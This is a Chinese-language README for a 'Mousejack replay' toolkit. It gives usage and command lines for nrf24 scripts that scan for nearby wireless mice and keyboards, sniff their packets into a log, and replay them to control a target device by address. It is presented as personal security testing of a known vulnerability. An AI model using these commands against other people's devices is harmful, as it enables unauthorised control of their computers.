# Mousejack replay
## 0x00 简介
Bastille的研究团队发现了一种针对蓝牙键盘鼠标的攻击，攻击者可以利用漏洞控制你的电脑操作。研究团队将此攻击命名为MouseJack。 Mousejack 之前在Freebuf上有所介绍：[MouseJack：利用15美元的工具和15行代码控制无线鼠标和键盘](http://www.freebuf.com/articles/wireless/97023.html)，当然，制作团队也将部分测试代码公开在[github](https://github.com/RFStorm/mousejack/)上，该团队网站地址为：https://www.mousejack.com/ 从视频中，可以看到攻击者通过此技术，直接操纵受害者电脑，但由于目前该团队并没有公开完整代码，所以有了下面的测试代码。
>怎么烧固件这里就不说了，在原[github](https://github.com/RFStorm/mousejack/)有详细说明，drops也有介绍:[Mousejack测试指南](http://drops.wooyun.org/tips/13444)，如果在windows平台，我也写过一个介绍:[windows下刷MouseJack固件](http://zone.wooyun.org/content/25763)。

## 0x01 原脚本测试

该团队所公布的代码主要包括了扫描跟嗅探模块，nrf24-network-mapper.py 中并没有能够让鼠标操作发生明显变化的payload，经过多次测试，写出了此测试脚本，能够完成对无线鼠标操作的重放攻击。

>测试发现，执行依此操作之后，需要对设备进行重新插拔

## 0x02 脚本介绍

### scanner

使用原作者的扫描脚本，此脚本用来扫描附近的无线鼠键：

```
usage: ./nrf24-scanner.py [-h] [-c N [N ...]] [-v] [-l] [-p PREFIX] [-d DWELL]

optional arguments:
  -h, --help                          show this help message and exit
  -c N [N ...], --channels N [N ...]  RF channels
  -v, --verbose                       Enable verbose output
  -l, --lna                           Enable the LNA (for CrazyRadio PA dongles)
  -p PREFIX, --prefix PREFIX          Promiscuous mode address prefix
  -d DWELL, --dwell DWELL             Dwell time per channel, in milliseconds
```

扫描信道 1-5 的设备：

```
./nrf24-scanner.py -c {1..5}
```

扫描起始地址为0xA9的设备的所有信道：

```
./nrf24-scanner.py -p A9
```


### sniffer

修改原作者脚本，将获取的设备数据存储到pack.log 中，之后可以使用mousejack-replay.py脚本对此数据进行重放：

```
usage: ./nrf24-sniffer.py [-h] [-c N [N ...]] [-v] [-l] -a ADDRESS [-t TIMEOUT] [-k ACK_TIMEOUT] [-r RETRIES]

optional arguments:
  -h, --help                                 show this help message and exit
  -c N [N ...], --channels N [N ...]         RF channels
  -v, --verbose                              Enable verbose output
  -l, --lna                                  Enable the LNA (for CrazyRadio PA dongles)
  -a ADDRESS, --address ADDRESS              Address to sniff, following as it changes channels
  -t TIMEOUT, --timeout TIMEOUT              Channel timeout, in milliseconds
  -k ACK_TIMEOUT, --ack_timeout ACK_TIMEOUT  ACK timeout in microseconds, accepts [250,4000], step 250
  -r RETRIES, --retries RETRIES              Auto retry limit, accepts [0,15]
```

嗅探地址为 61:49:66:82:03 设备所有信道的数据包并将数据包保存：

```
./nrf24-sniffer.py -a 61:49:66:82:03
```

### mousejack-replay.py 

在 network mapper 脚本上修改，首先通过Ping获取可用信道，然后读取pack.log中的数据包内容，将每一条数据发送到各个信道，完成数据包重放,测试过程中，发现可用地址一般为3-4个，所以将原脚本改成rang(4)：

```
usage: ./mousejack-replay.py [-h] [-c N [N ...]] [-v] [-l] -a ADDRESS [-p PASSES] [-k ACK_TIMEOUT] [-r RETRIES]

optional arguments:
  -h, --help                                 show this help message and exit
  -c N [N ...], --channels N [N ...]         RF channels
  -v, --verbose                              Enable verbose output
  -l, --lna                                  Enable the LNA (for CrazyRadio PA dongles)
  -a ADDRESS, --address ADDRESS              Known address
  -p PASSES, --passes PASSES                 Number of passes (default 2)
  -k ACK_TIMEOUT, --ack_timeout ACK_TIMEOUT  ACK timeout in microseconds, accepts [250,4000], step 250
  -r RETRIES, --retries RETRIES              Auto retry limit, accepts [0,15]
```

指定地址为 61:49:66:82:03 的设备进行数据包重放：

```
./mousejack-replay.py -a 61:49:66:82:03
```

## 0x03备注
以上为个人测试结果，由于目前手上只有一个鼠标可以测试，可能并不适用所有存在漏洞设备，有兴趣的小伙伴可以找我一起研究，可以对脚本进行进一步的完善。

右键点击演示视频：http://v.youku.com/v_show/id_XMTUwMTQ3Njk4NA==.html

数据重放演示视频：http://v.youku.com/v_show/id_XMTUwMzgwMTQ1Ng==.html

